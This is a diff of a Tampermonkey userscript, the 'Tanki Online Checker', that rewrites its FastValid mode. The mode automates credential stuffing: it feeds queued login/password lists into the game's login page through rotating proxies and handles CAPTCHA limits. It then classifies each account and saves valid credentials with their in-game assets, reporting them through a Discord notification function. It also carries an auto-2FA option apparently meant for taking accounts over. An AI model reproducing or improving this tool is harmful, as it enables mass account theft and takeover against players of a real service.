@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Tanki Online — Checker prod. by yuuairline
 // @namespace    http://tampermonkey.net/
-// @version      1.0.3
+// @version      1.0.4
 // @description  Checker + auto 2FA enable
 // @author       yuuairline
 // @match        https://*.tankionline.com/play/
@@ -60,8 +60,8 @@
         PROXY_ROTATION_TEST_TIMEOUT: 10000,
         PROXY_ENABLED: true,
         AUTO_ENABLE_2FA: false,
-        RUBIES_STATUS_FILTER_MODE: "default", 
-        RUBIES_STATUS_FILTER: [], 
+        RUBIES_STATUS_FILTER_MODE: "default",
+        RUBIES_STATUS_FILTER: [],
 
         TWOFA_ACCOUNTS_KEY: "tanki_2fa_accounts_v1",
         TWOFA_ARCHIVE_KEY: "tanki_2fa_accounts_archive_v1"
@@ -244,7 +244,9 @@
     }
     function isFastValidFinished(login) {
         const s = getFastValidStatus(login);
-        return !!(s && (s.done || s.blocked || s.nicknameChanged || s.invalid || s.twofa || s.deleted || s.error));
+        if (!s) return false;
+        if (s.temporary) return false;
+        return !!(s.done || s.blocked || s.nicknameChanged || s.invalid || s.twofa || s.deleted || (s.error && !s.temporary));
     }
     function clearFastValidStatuses() {
         for (const acc of FAST_VALID_ACCOUNTS) {
@@ -1658,12 +1660,12 @@
             const style = document.createElement("style");
             style.id = styleId;
             style.textContent = `
-                #proxy-rotation-settings{margin-top:28px;padding:16px;border:1px solid var(--tc-border);border-radius:14px;background:linear-gradient(180deg,var(--tc-surface-2),var(--tc-surface));}
+                #proxy-rotation-settings{margin-top:28px;padding:16px;border:1px solid var(--tc-border);border-radius:8px;background:var(--tc-surface);}
                 .tc-pr-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px;}
                 .tc-pr-title{font-size:13px;font-weight:800;letter-spacing:.08em;color:var(--tc-text);}
                 .tc-pr-status{display:flex;align-items:center;gap:7px;font-size:10px;font-weight:800;letter-spacing:.08em;color:var(--tc-text-muted);}
                 .tc-pr-dot{width:8px;height:8px;border-radius:50%;background:#777;box-shadow:0 0 9px currentColor;}
-                .tc-pr-dot.active{background:#50e38b;color:#50e38b;}.tc-pr-dot.error{background:#ff5c68;color:#ff5c68;}
+                .tc-pr-dot.active{background:#4fd6a0;color:#4fd6a0;}.tc-pr-dot.error{background:#f07178;color:#f07178;}
                 .tc-pr-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
                 .tc-pr-card{padding:11px 12px;border:1px solid var(--tc-border);border-radius:10px;background:var(--tc-surface);}
                 .tc-pr-label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--tc-text-dim);margin-bottom:4px;}
@@ -1671,13 +1673,13 @@
                 .tc-pr-time{font-size:21px;font-variant-numeric:tabular-nums;}
                 .tc-pr-editor{margin-top:10px;}
                 .tc-pr-textarea{box-sizing:border-box;width:100%;min-height:105px;resize:vertical;padding:10px 11px;border:1px solid var(--tc-border);border-radius:10px;background:var(--tc-surface);color:var(--tc-text);font:12px/1.5 ui-monospace,SFMono-Regular,Consolas,monospace;outline:none;}
-                .tc-pr-textarea:focus{border-color:#8ab4ff;box-shadow:0 0 0 2px rgba(138,180,255,.12);}
+                .tc-pr-textarea:focus{border-color:rgba(208,214,224,.45);box-shadow:0 0 0 2px rgba(208,214,224,.12);}
                 .tc-pr-help{margin-top:6px;font-size:10px;line-height:1.4;color:var(--tc-text-muted);}
                 .tc-pr-actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px;}
                 .tc-pr-actions .tc-btn{margin:0;}
                 .tc-pr-wide{grid-column:1/-1;}
                 .tc-pr-auto{display:flex;align-items:center;justify-content:space-between;width:100%;}
-                .tc-pr-error{grid-column:1/-1;min-height:16px;font-size:11px;line-height:1.45;color:#ff7b84;word-break:break-word;}
+                .tc-pr-error{grid-column:1/-1;min-height:16px;font-size:11px;line-height:1.45;color:#f07178;word-break:break-word;}
                 @media(max-width:650px){.tc-pr-grid{grid-template-columns:1fr;}.tc-pr-actions{grid-template-columns:1fr;}.tc-pr-wide{grid-column:auto;}}
             `;
             document.head.appendChild(style);
@@ -2172,7 +2174,7 @@
             return null;
         }
     }
-    
+
     function registerCaptchaProxyFailure() {
         const st = loadCaptchaProxyFailState();
         const proxyId = getCurrentProxyIdForCaptcha();
@@ -3646,7 +3648,7 @@ async function testDiscordNotification() {
             }
         }
         const unique = [...byLogin.values()];
-        const seenSecrets = new Map(); 
+        const seenSecrets = new Map();
         const kept = [];
         let archivedDupSecret = 0;
         for (const r of unique) {
@@ -5028,308 +5030,542 @@ async function testDiscordNotification() {
     // =========================================================
     // FAST VALID CHECKER (MODE === "fastValid")
     // =========================================================
-    async function checkAccountFastValid(login, password, email = null) {
-        email = normalizeEmail(email);
-        if (!isRunning) return { login, status: "stopped" };
+    // Early auth-state detection: no full game load required.
+    // Valid = login form gone + no known error/2FA/block screens.
+    // =========================================================
 
-        if (CONFIG.PROXY_ENABLED) {
-            if (proxyRotationManager) {
-                const proxyReady = await proxyRotationManager.beginAccountCheck(login);
-                if (!proxyReady) {
-                    console.error(`[PROXY] FastValid: proxy is not ready for ${login}; account check is paused`);
-                    return { login, status: "proxy_not_ready" };
-                }
-            } else {
-                console.error("[PROXY] FastValid: ProxyRotationManager is not initialized");
-                return { login, status: "proxy_not_initialized" };
+    function fvLog(msg) {
+        console.log(`[FastValid] ${msg}`);
+    }
+
+    function fvHasLoginForm() {
+        const user = document.querySelector("#username");
+        const pass = document.querySelector("#password");
+        if (!user || !pass) return false;
+        if (!user.isConnected || !pass.isConnected) return false;
+        const rect = user.getBoundingClientRect();
+        return rect.width > 0 && rect.height > 0;
+    }
+
+    function fvDetectAuthState() {
+        
+        const titleEls = document.querySelectorAll(
+            ".EntranceComponentStyle-title, [class*='EntranceComponentStyle-title'], .HeaderComponentStyle-messageTitle"
+        );
+        for (const el of titleEls) {
+            const t = (el.textContent || "").replace(/\s+/g, " ").trim();
+            if (/Код\s+безопасности/i.test(t) || /security\s+code/i.test(t) || /two[-\s]?factor/i.test(t)) {
+                return { status: "twofa", reason: "Требуется 2FA" };
             }
-        } else if (proxyRotationManager) {
-            await proxyRotationManager.beginAccountCheck(login);
+            if (/Изменить\s+никнейм/i.test(t) || /Change\s+nickname/i.test(t)) {
+                return { status: "nickname", reason: "Требуется смена ника" };
+            }
         }
 
-        const log = (msg) => console.log(`[FastValid] ${msg}`);
-        let timestamp = new Date().toLocaleTimeString();
-        log(`Авторизация: ${login}`);
-
-        if (isFastValidFinished(login)) {
-            advanceFastValidQueue();
-            return { login, status: "skipped" };
+        const sysMsg = document.querySelector(".SystemMessageStyle-message, [class*='SystemMessageStyle-message']");
+        if (sysMsg) {
+            const t = (sysMsg.textContent || "").replace(/\s+/g, " ");
+            if (/заблокирован/i.test(t) || /blocked/i.test(t) || /бан/i.test(t)) {
+                return { status: "blocked", reason: "Аккаунт заблокирован" };
+            }
         }
 
-        if (window.__tankiFastValidHandledLogin === login) {
-            log(`Уже обработан на этой странице: ${login}`);
-            return { login, status: "already_handled" };
+        const bodyText = (document.body && document.body.innerText) ? document.body.innerText.slice(0, 4000) : "";
+        if (/аккаунт\s+(удал[её]н|не\s+найден)/i.test(bodyText) || /account\s+(deleted|not\s+found)/i.test(bodyText)) {
+            return { status: "deleted", reason: "Аккаунт удалён" };
         }
 
-        let usedLogin = normalizeEmail(email) || login;
-        let loginWasEmail = !!normalizeEmail(email);
+        if (document.querySelector(".EntranceComponentStyle-invalidForm, [class*='invalidForm']")) {
+            if (!isEmptyLoginOrEmailErrorVisible()) {
+                return { status: "invalid", reason: "Неверный логин/пароль" };
+            }
+        }
+        const errBlocks = document.querySelectorAll(
+            ".EntranceComponentStyle-informationWriting span, .EntranceComponentStyle-commonBlockMessageError, .textError, [class*='commonBlockMessageError']"
+        );
+        for (const el of errBlocks) {
+            const t = (el.textContent || "").replace(/\s+/g, " ").trim();
+            if (/Неправильный\s+логин\s+или\s+пароль/i.test(t) || /invalid\s+(login|password|credentials)/i.test(t)) {
+                return { status: "invalid", reason: "Неверный логин/пароль" };
+            }
+        }
 
         try {
-            if (checkConnectionError()) {
-                location.reload();
-                return { login, status: "reload" };
+            if (typeof findNicknameForm === "function" && findNicknameForm()) {
+                return { status: "nickname", reason: "Требуется смена ника" };
+            }
+        } catch (_) {}
+
+        if (document.querySelector(".UserInfoContainerStyle-userNameRank, [class*='UserInfoContainerStyle-userNameRank']")) {
+            return { status: "valid", reason: "lobby", confirmed: true };
+        }
+
+        const formGone = !fvHasLoginForm();
+        const playBtn = document.querySelector(".EntranceComponentStyle-buttonActive, [class*='EntranceComponentStyle-buttonActive']");
+        const entranceRoot = document.querySelector(
+            ".EntranceComponentStyle-container, [class*='EntranceComponentStyle-container'], #username"
+        );
+        if (formGone && !playBtn) {
+            const stillEntranceTitle = [...titleEls].some(el => {
+                const t = (el.textContent || "").trim();
+                return /Авторизац|Игровой\s+аккаунт|Вход|Sign\s+in|Log\s+in/i.test(t);
+            });
+            if (!stillEntranceTitle) {
+                return { status: "valid", reason: "form_gone", confirmed: false };
+            }
+        }
+
+        if (typeof isCaptchaVisible === "function" && isCaptchaVisible()) {
+            return { status: "captcha", reason: "CAPTCHA" };
+        }
+
+        if (fvHasLoginForm()) {
+            return { status: "pending", reason: "form_visible" };
+        }
+
+        return { status: "unknown", reason: "ambiguous" };
+    }
+
+    function fvWaitForAuthOutcome(options = {}) {
+        const timeoutMs = options.timeoutMs || 6500;
+        const confirmMs = options.confirmMs || 280;
+        const started = Date.now();
+
+        return new Promise((resolve) => {
+            let settled = false;
+            let pendingValid = null;
+            let confirmTimer = null;
+            let pollTimer = null;
+            let observer = null;
+
+            const cleanup = () => {
+                if (observer) {
+                    try { observer.disconnect(); } catch (_) {}
+                    observer = null;
+                }
+                if (confirmTimer) {
+                    clearTimeout(confirmTimer);
+                    confirmTimer = null;
+                }
+                if (pollTimer) {
+                    clearInterval(pollTimer);
+                    pollTimer = null;
+                }
+            };
+
+            const finish = (result) => {
+                if (settled) return;
+                settled = true;
+                cleanup();
+                result.elapsedMs = Date.now() - started;
+                resolve(result);
+            };
+
+            const evaluate = () => {
+                if (settled) return;
+                if (!isRunning) {
+                    finish({ status: "stopped", reason: "stopped" });
+                    return;
+                }
+                if (typeof checkConnectionError === "function" && checkConnectionError()) {
+                    finish({ status: "reload", reason: "connection_error" });
+                    return;
+                }
+                if (typeof handleEmptyLoginOrEmailError === "function" && handleEmptyLoginOrEmailError()) {
+                    finish({ status: "empty_login_reload", reason: "empty_login" });
+                    return;
+                }
+
+                const state = fvDetectAuthState();
+
+                if (state.status === "valid") {
+                    if (state.confirmed) {
+                        finish(state);
+                        return;
+                    }
+                    if (!pendingValid) {
+                        pendingValid = state;
+                        confirmTimer = setTimeout(() => {
+                            const again = fvDetectAuthState();
+                            if (again.status === "valid") finish(again);
+                            else if (again.status === "pending" || again.status === "unknown") {
+                                pendingValid = null;
+                            } else {
+                                finish(again);
+                            }
+                        }, confirmMs);
+                    }
+                    return;
+                }
+
+                if (pendingValid && (state.status === "pending" || state.status === "unknown")) {
+                    if (confirmTimer) {
+                        clearTimeout(confirmTimer);
+                        confirmTimer = null;
+                    }
+                    pendingValid = null;
+                }
+
+                if (state.status === "twofa" || state.status === "blocked" ||
+                    state.status === "invalid" || state.status === "deleted" ||
+                    state.status === "nickname" || state.status === "captcha") {
+                    finish(state);
+                    return;
+                }
+
+                if (Date.now() - started >= timeoutMs) {
+                    const finalState = fvDetectAuthState();
+                    if (finalState.status === "valid") {
+                        finish(finalState);
+                        return;
+                    }
+                    if (finalState.status === "twofa" || finalState.status === "blocked" ||
+                        finalState.status === "invalid" || finalState.status === "deleted" ||
+                        finalState.status === "nickname") {
+                        finish(finalState);
+                        return;
+                    }
+                    finish({ status: "timeout", reason: "auth_timeout", detail: finalState.status });
+                }
+            };
+
+            try {
+                observer = new MutationObserver(() => evaluate());
+                observer.observe(document.documentElement, {
+                    childList: true,
+                    subtree: true,
+                    attributes: true,
+                    characterData: true
+                });
+            } catch (_) {}
+
+            pollTimer = setInterval(evaluate, 180);
+            evaluate();
+        });
+    }
+
+    async function fvEnterCredentialsFast(login, password) {
+        window.__tankiTypingCredentials = true;
+        try {
+            clearInputFields();
+            await sleep(40);
+            const loginInput = await waitForElement("#username", 2200, 4);
+            setValueNative(loginInput, login);
+            loginInput.dispatchEvent(new Event("input", { bubbles: true }));
+            loginInput.dispatchEvent(new Event("change", { bubbles: true }));
+            await sleep(30);
+            const passInput = await waitForElement("#password", 1600, 3);
+            setValueNative(passInput, password);
+            passInput.dispatchEvent(new Event("input", { bubbles: true }));
+            passInput.dispatchEvent(new Event("change", { bubbles: true }));
+            try {
+                const cb = document.querySelector('.CheckBoxStyle-checkbox input[type="checkbox"]');
+                if (cb && cb.checked) cb.click();
+            } catch (_) {}
+            await sleep(40);
+            await clickByText("Играть", 4000);
+            await sleep(120);
+        } finally {
+            setTimeout(() => { window.__tankiTypingCredentials = false; }, 800);
+        }
+    }
+
+    async function checkAccountFastValid(login, password, email = null) {
+        let guard = 0;
+        const maxPerPage = 80;
+
+        while (isRunning && guard < maxPerPage) {
+            guard++;
+            email = normalizeEmail(email);
+            if (!isRunning) return { login, status: "stopped" };
+
+            if (CONFIG.PROXY_ENABLED) {
+                if (proxyRotationManager) {
+                    const proxyReady = await proxyRotationManager.beginAccountCheck(login);
+                    if (!proxyReady) {
+                        console.error(`[PROXY] FastValid: proxy is not ready for ${login}; account check is paused`);
+                        return { login, status: "proxy_not_ready" };
+                    }
+                } else {
+                    console.error("[PROXY] FastValid: ProxyRotationManager is not initialized");
+                    return { login, status: "proxy_not_initialized" };
+                }
+            } else if (proxyRotationManager) {
+                await proxyRotationManager.beginAccountCheck(login);
             }
 
-            const startContainer = await tryFindElement(".StartScreenComponentStyle-mainContainer", 800, 3);
-            if (startContainer) {
-                startContainer.click();
-                await sleep(randomDelay(220, 380));
+            const t0 = performance.now();
+            fvLog(`Авторизация: ${login}`);
+
+            if (isFastValidFinished(login)) {
+                advanceFastValidQueue();
+                const n = getNextAccount();
+                if (!n) {
+                    setRunningState(false);
+                    clearFastValidQueue();
+                    updateUI();
+                    showToast("FastValid: все аккаунты проверены", "success");
+                    return { login, status: "skipped_done" };
+                }
+                login = n.login; password = n.password; email = n.email || null;
+                continue;
             }
 
-            await clickByText("Игровой аккаунт", 8500);
-            await clickByText("Авторизация", 6500);
-            await enterCredentialsAndPlay(usedLogin, password);
-            await sleep(800);
-
-            if (await reloadIfLoginFormEmptyTooLong(5000)) {
-                return { login, status: "reload_empty" };
+            if (window.__tankiFastValidHandledLogin === login) {
+                fvLog(`Уже обработан на этой странице: ${login}`);
+                advanceFastValidQueue();
+                const n = getNextAccount();
+                if (!n || !isRunning) {
+                    setRunningState(false);
+                    clearFastValidQueue();
+                    updateUI();
+                    return { login, status: "already_handled" };
+                }
+                login = n.login; password = n.password; email = n.email || null;
+                window.__tankiFastValidHandledLogin = null;
+                continue;
             }
 
-            let captchaResult = await handleCaptchaIfVisible(login, timestamp);
-            if (captchaResult) {
-                if (captchaResult.status === "captcha") log(`🤖 CAPTCHA ${getCaptchaCount()}/${CAPTCHA_LIMIT}: ${login}`);
-                if (captchaResult.status === "captcha_stop") log(`🤖 CAPTCHA лимит — стоп: ${login}`);
-                return captchaResult;
-            }
-
+            let usedLogin = normalizeEmail(email) || login;
+            let loginWasEmail = !!normalizeEmail(email);
             let triedEmail = false;
-            while (isRunning) {
+
+            const finishAccount = async (statusObj) => {
+                const elapsed = Math.round(performance.now() - t0);
+                fvLog(`${statusObj.status.toUpperCase()} ${login} (${elapsed}ms) — ${statusObj.reason || ""}`);
+                window.__tankiFastValidHandledLogin = login;
+
+                const prev = getFastValidStatus(login) || {};
+                const payload = { ...prev, ...statusObj, checkedAt: new Date().toISOString(), elapsedMs: elapsed };
+
+                if (statusObj.status === "valid") {
+                    payload.done = true;
+                    payload.valid = true;
+                    payload.fastValid = true;
+                    payload.loginEmail = loginWasEmail ? usedLogin : (prev.loginEmail || null);
+                    try {
+                        const nick = getCurrentNickname();
+                        if (nick) payload.username = nick;
+                    } catch (_) {}
+                    setFastValidStatus(login, payload);
+                    try {
+                        upsertValidResult({
+                            login,
+                            password,
+                            username: payload.username || null,
+                            rank: payload.rank || null,
+                            experience: payload.experience ?? null,
+                            rubies: payload.rubies || "0",
+                            crystals: payload.crystals || "0",
+                            source: "fastValid"
+                        });
+                    } catch (_) {}
+                    try {
+                        const accInfo = FAST_VALID_ACCOUNTS.find(a => a.login === login) || {};
+                        notifyValidAccount({
+                            login,
+                            password,
+                            email: accInfo.email || (loginWasEmail ? usedLogin : null) || null,
+                            rubies: "—", tankoins: "—", crystals: "—", goldBoxes: "—",
+                            rank: "—", experience: "—",
+                            year: accInfo.year, bound: accInfo.bound,
+                            nickChange: null, ip: null, loginWasEmail,
+                            bonusReceived: false, loginUsed: usedLogin, newNickname: null
+                        }).catch(() => {});
+                    } catch (_) {}
+                } else if (statusObj.status === "invalid") {
+                    setFastValidStatus(login, { ...payload, invalid: true });
+                } else if (statusObj.status === "blocked") {
+                    setFastValidStatus(login, { ...payload, blocked: true });
+                } else if (statusObj.status === "twofa") {
+                    setFastValidStatus(login, { ...payload, twofa: true });
+                } else if (statusObj.status === "deleted") {
+                    setFastValidStatus(login, { ...payload, deleted: true });
+                } else if (statusObj.status === "nickname") {
+                    setFastValidStatus(login, { ...payload, nicknameChanged: true });
+                } else if (statusObj.status === "timeout" || statusObj.status === "unknown") {
+                    setFastValidStatus(login, {
+                        ...prev,
+                        error: true,
+                        temporary: true,
+                        reason: statusObj.reason || "timeout",
+                        checkedAt: new Date().toISOString(),
+                        elapsedMs: elapsed
+                    });
+                } else if (statusObj.status === "error") {
+                    setFastValidStatus(login, { ...prev, error: true, reason: statusObj.reason });
+                }
+
+                if (statusObj.status !== "captcha" && statusObj.status !== "proxy_not_ready" &&
+                    statusObj.status !== "reload" && statusObj.status !== "empty_login_reload" &&
+                    statusObj.status !== "stopped" && statusObj.status !== "already_handled") {
+                    advanceFastValidQueue();
+                }
+
+                if (proxyRotationManager && MODE === "fastValid") {
+                    try { proxyRotationManager.finishAccountCheck(login); } catch (_) {}
+                }
+
+                return { login, ...statusObj, elapsedMs: elapsed };
+            };
+
+            try {
                 if (checkConnectionError()) {
                     location.reload();
                     return { login, status: "reload" };
                 }
-                timestamp = new Date().toLocaleTimeString();
 
-                if (await reloadIfLoginFormEmptyTooLong(5000)) {
-                    return { login, status: "reload_empty" };
-                }
-
-                captchaResult = await handleCaptchaIfVisible(login, timestamp);
-                if (captchaResult) {
-                    if (captchaResult.status === "captcha") log(`🤖 CAPTCHA ${getCaptchaCount()}/${CAPTCHA_LIMIT}: ${login}`);
-                    if (captchaResult.status === "captcha_stop") log(`🤖 CAPTCHA лимит — стоп: ${login}`);
-                    return captchaResult;
-                }
-
-                if (handleEmptyLoginOrEmailError()) {
-                    return { login, status: "empty_login_reload" };
-                }
-
-                const twofa = document.querySelector(".EntranceComponentStyle-title");
-                if (twofa && twofa.textContent.includes("Код безопасности")) {
-                    resetCaptchaCount("2FA");
-                    log(`🔐 2FA: ${login}`);
-                    setFastValidStatus(login, { twofa: true, reason: "Требуется 2FA" });
-                    advanceFastValidQueue();
-                    location.reload();
-                    return { login, status: "twofa" };
-                }
-
-                const errorElement = document.querySelector(".EntranceComponentStyle-invalidForm");
-                if (errorElement) {
-                    if (isEmptyLoginOrEmailErrorVisible()) {
-                        if (handleEmptyLoginOrEmailError()) return { login, status: "empty_login_reload" };
+                if (typeof isStartScreenVisible === "function" && isStartScreenVisible()) {
+                    try { clickStartScreenOnce(); } catch (_) {}
+                    await sleep(200);
+                } else {
+                    const startContainer = document.querySelector(".StartScreenComponentStyle-mainContainer");
+                    if (startContainer) {
+                        try { startContainer.click(); } catch (_) {}
+                        await sleep(150);
                     }
-                    if (!triedEmail && normalizeEmail(email)) {
-                        triedEmail = true;
-                        usedLogin = email;
-                        loginWasEmail = true;
-                        await sleep(200);
-                        await enterCredentialsAndPlay(usedLogin, password);
-                        continue;
+                }
+
+                if (!fvHasLoginForm()) {
+                    try { await clickByText("Игровой аккаунт", 3500); } catch (_) {}
+                    try { await clickByText("Авторизация", 3000); } catch (_) {}
+                }
+
+                if (!fvHasLoginForm()) {
+                    const formDeadline = Date.now() + 2500;
+                    while (Date.now() < formDeadline && !fvHasLoginForm() && isRunning) {
+                        await sleep(80);
                     }
-                    resetCaptchaCount("invalid");
-                    log(`❌ Ошибка авторизации: ${login}`);
-                    setFastValidStatus(login, { invalid: true, reason: "Неверный логин/пароль" });
-                    advanceFastValidQueue();
+                }
+
+                if (!fvHasLoginForm()) {
+                    fvLog(`Форма логина не найдена для ${login}`);
+                    await finishAccount({ status: "error", reason: "login_form_missing" });
+                    const n = getNextAccount();
+                    if (n && isRunning) {
+                        await sleep(80);
+                        location.reload();
+                    } else {
+                        setRunningState(false);
+                        clearFastValidQueue();
+                        updateUI();
+                    }
+                    return { login, status: "error" };
+                }
+
+                await fvEnterCredentialsFast(usedLogin, password);
+
+                let captchaResult = await handleCaptchaIfVisible(login, new Date().toLocaleTimeString());
+                if (captchaResult) return captchaResult;
+
+                let outcome = await fvWaitForAuthOutcome({ timeoutMs: 6000, confirmMs: 260 });
+
+                if (outcome.status === "invalid" && !triedEmail && normalizeEmail(email)) {
+                    triedEmail = true;
+                    usedLogin = email;
+                    loginWasEmail = true;
+                    fvLog(`Retry email: ${usedLogin}`);
+                    await fvEnterCredentialsFast(usedLogin, password);
+                    captchaResult = await handleCaptchaIfVisible(login, new Date().toLocaleTimeString());
+                    if (captchaResult) return captchaResult;
+                    outcome = await fvWaitForAuthOutcome({ timeoutMs: 5000, confirmMs: 260 });
+                }
+
+                if (outcome.status === "captcha") {
+                    const cr = await handleCaptchaIfVisible(login, new Date().toLocaleTimeString());
+                    if (cr) return cr;
+                    outcome = { status: "timeout", reason: "captcha_unresolved" };
+                }
+
+                if (outcome.status === "reload" || outcome.status === "empty_login_reload") {
+                    return { login, status: outcome.status };
+                }
+                if (outcome.status === "stopped") {
+                    return { login, status: "stopped" };
+                }
+
+                const result = await finishAccount(outcome);
+
+                resetCaptchaCount(
+                    outcome.status === "valid" ? "успешный вход fastValid" :
+                    outcome.status === "invalid" ? "invalid" :
+                    outcome.status === "blocked" ? "blocked" :
+                    outcome.status === "twofa" ? "2FA" : "fastValid end"
+                );
+                clearEmptyLoginReloadState();
+
+                if (outcome.status === "invalid") {
                     const nextAcc = getNextAccount();
                     if (!nextAcc || !isRunning) {
-                        clearInputFields();
-                        return { login, status: "invalid" };
+                        setRunningState(false);
+                        clearFastValidQueue();
+                        updateUI();
+                        showToast("FastValid: все аккаунты проверены", "success");
+                        fvLog("Готово — очередь пуста");
+                        return result;
                     }
+                    fvLog(`➡ invalid → следующий без reload: ${nextAcc.login}`);
+                    try { clearInputFields(); } catch (_) {}
+                    await sleep(50);
+                    window.__tankiFastValidHandledLogin = null;
                     login = nextAcc.login;
                     password = nextAcc.password;
-                    email = normalizeEmail(nextAcc.email);
-                    usedLogin = login;
-                    loginWasEmail = false;
-                    triedEmail = false;
-                    await sleep(70);
-                    await enterCredentialsAndPlay(login, password);
+                    email = nextAcc.email || null;
                     continue;
                 }
 
-                const blocked = document.querySelector(".SystemMessageStyle-message");
-                if (blocked && blocked.textContent.includes("заблокирован")) {
-                    resetCaptchaCount("blocked");
-                    log(`🚫 Заблокирован: ${login}`);
-                    setFastValidStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
-                    advanceFastValidQueue();
-                    location.reload();
-                    return { login, status: "blocked" };
-                }
-
-                const nickFormEarly = findNicknameForm();
-                const nickTitleEl = document.querySelector(".HeaderComponentStyle-messageTitle") || document.querySelector(".EntranceComponentStyle-title");
-                const nickTitleText = (nickTitleEl?.textContent || "").trim();
-                if (nickFormEarly || nickTitleText.includes("Изменить никнейм")) {
-                    resetCaptchaCount("nickname form");
-                    log(`🔄 Требуется смена ника (пропуск): ${login}`);
-                    setFastValidStatus(login, { nicknameChanged: true, reason: "Требуется смена ника (fastValid)" });
-                    advanceFastValidQueue();
-                    location.reload();
-                    return { login, status: "nickname_required" };
-                }
-
-                if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
-                    break;
-                }
-
-                await sleep(150);
-            }
-
-            if (!isRunning) return { login, status: "stopped" };
-
-            {
-                const deadline = Date.now() + 12000;
-                let ready = false;
-                while (Date.now() < deadline) {
-                    const blockedPost = document.querySelector(".SystemMessageStyle-message");
-                    if (blockedPost && (blockedPost.textContent || "").includes("заблокирован")) {
-                        resetCaptchaCount("blocked post-login");
-                        log(`🚫 Заблокирован post-login: ${login}`);
-                        setFastValidStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
-                        advanceFastValidQueue();
+                if (outcome.status === "valid" || outcome.status === "blocked" ||
+                    outcome.status === "twofa" || outcome.status === "deleted" ||
+                    outcome.status === "nickname" || outcome.status === "timeout" ||
+                    outcome.status === "unknown" || outcome.status === "error") {
+                    const nextAcc = getNextAccount();
+                    if (nextAcc && isRunning) {
+                        fvLog(`➡ Следующий (reload): ${nextAcc.login}`);
+                        await sleep(80);
                         location.reload();
-                        return { login, status: "blocked" };
+                    } else {
+                        setRunningState(false);
+                        clearFastValidQueue();
+                        updateUI();
+                        showToast("FastValid: все аккаунты проверены", "success");
+                        fvLog("Готово — очередь пуста");
                     }
-                    const twofaPost = document.querySelector(".EntranceComponentStyle-title");
-                    if (twofaPost && (twofaPost.textContent || "").includes("Код безопасности")) {
-                        resetCaptchaCount("2FA post-login");
-                        log(`🔐 2FA post-login: ${login}`);
-                        setFastValidStatus(login, { twofa: true, reason: "Требуется 2FA" });
-                        advanceFastValidQueue();
-                        location.reload();
-                        return { login, status: "twofa" };
-                    }
-                    if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
-                        ready = true;
-                        break;
-                    }
-                    await sleep(150);
+                    return result;
                 }
-                if (!ready) {
-                    try {
-                        await waitForElement(".UserInfoContainerStyle-userNameRank", 4000, 4);
-                        ready = true;
-                    } catch (e) {
-                        const blockedF = document.querySelector(".SystemMessageStyle-message");
-                        if (blockedF && (blockedF.textContent || "").includes("заблокирован")) {
-                            resetCaptchaCount("blocked final");
-                            setFastValidStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
-                            advanceFastValidQueue();
-                            location.reload();
-                            return { login, status: "blocked" };
-                        }
-                        const twofaF = document.querySelector(".EntranceComponentStyle-title");
-                        if (twofaF && (twofaF.textContent || "").includes("Код безопасности")) {
-                            resetCaptchaCount("2FA final");
-                            setFastValidStatus(login, { twofa: true, reason: "Требуется 2FA" });
-                            advanceFastValidQueue();
-                            location.reload();
-                            return { login, status: "twofa" };
-                        }
-                        throw e;
+
+                return result;
+
+            } catch (error) {
+                console.error(`[FastValid] ❌ Ошибка ${login}:`, error);
+                resetCaptchaCount("error");
+                await finishAccount({ status: "error", reason: (error && error.message) || String(error) });
+                try { clearInputFields(); } catch (_) {}
+                const nextAcc = getNextAccount();
+                if (nextAcc && isRunning) {
+                    if (fvHasLoginForm()) {
+                        window.__tankiFastValidHandledLogin = null;
+                        login = nextAcc.login;
+                        password = nextAcc.password;
+                        email = nextAcc.email || null;
+                        await sleep(60);
+                        continue;
                     }
+                    await sleep(100);
+                    location.reload();
+                } else {
+                    setRunningState(false);
+                    clearFastValidQueue();
+                    updateUI();
                 }
+                return { login, status: "error" };
             }
-
-            window.__tankiFastValidHandledLogin = login;
-            resetCaptchaCount("успешный вход fastValid");
-            clearEmptyLoginReloadState();
-
-            log(`✅ Валидный аккаунт: ${login}`);
-
-            let nickname = null, experience = null, rankName = null, rubies = null, crystals = null;
-            try { nickname = getCurrentNickname(); } catch (_) {}
-            try { experience = getExperience(); } catch (_) {}
-            try {
-                if (experience != null) rankName = getRankByExperience(experience).rankName;
-            } catch (_) {}
-            try { rubies = getRubies() || null; } catch (_) {}
-            try { crystals = getCrystals() || null; } catch (_) {}
-
-            const prev = getFastValidStatus(login) || {};
-            setFastValidStatus(login, {
-                ...prev,
-                done: true,
-                valid: true,
-                fastValid: true,
-                username: nickname || prev.username || null,
-                experience: experience != null ? experience : (prev.experience ?? null),
-                rank: rankName || prev.rank || null,
-                rubies: rubies || prev.rubies || null,
-                crystals: crystals || prev.crystals || null,
-                loginEmail: loginWasEmail ? usedLogin : (prev.loginEmail || null)
-            });
-
-            upsertValidResult({
-                login,
-                password,
-                username: nickname || null,
-                rank: rankName || null,
-                experience: experience != null ? experience : null,
-                rubies: rubies || "0",
-                crystals: crystals || "0",
-                source: "fastValid"
-            });
-            log(`💾 Результат сохранён: ${login}`);
-
-            const accInfo = FAST_VALID_ACCOUNTS.find(a => a.login === login) || {};
-            log(`📤 Discord: ${login}`);
-            await notifyValidAccount({
-                login,
-                password,
-                email: accInfo.email || (loginWasEmail ? usedLogin : null) || null,
-                rubies: rubies || "—",
-                tankoins: "—",
-                crystals: crystals || "—",
-                goldBoxes: "—",
-                rank: rankName || "—",
-                experience: experience != null ? experience : "—",
-                year: accInfo.year,
-                bound: accInfo.bound,
-                nickChange: null,
-                ip: null,
-                loginWasEmail,
-                bonusReceived: false,
-                loginUsed: usedLogin,
-                newNickname: null
-            });
-            await sleep(350);
-
-            advanceFastValidQueue();
-            const nextAcc = getNextAccount();
-            if (nextAcc) {
-                log(`➡ Следующий аккаунт: ${nextAcc.login}`);
-                log(`🔄 Reload`);
-                location.reload();
-            } else {
-                setRunningState(false);
-                clearFastValidQueue();
-                updateUI();
-                showToast("FastValid: все аккаунты проверены", "success");
-                log(`Готово — очередь пуста`);
-            }
-            return { login, status: "success" };
-
-        } catch (error) {
-            console.error(`[FastValid] ❌ Ошибка ${login}:`, error);
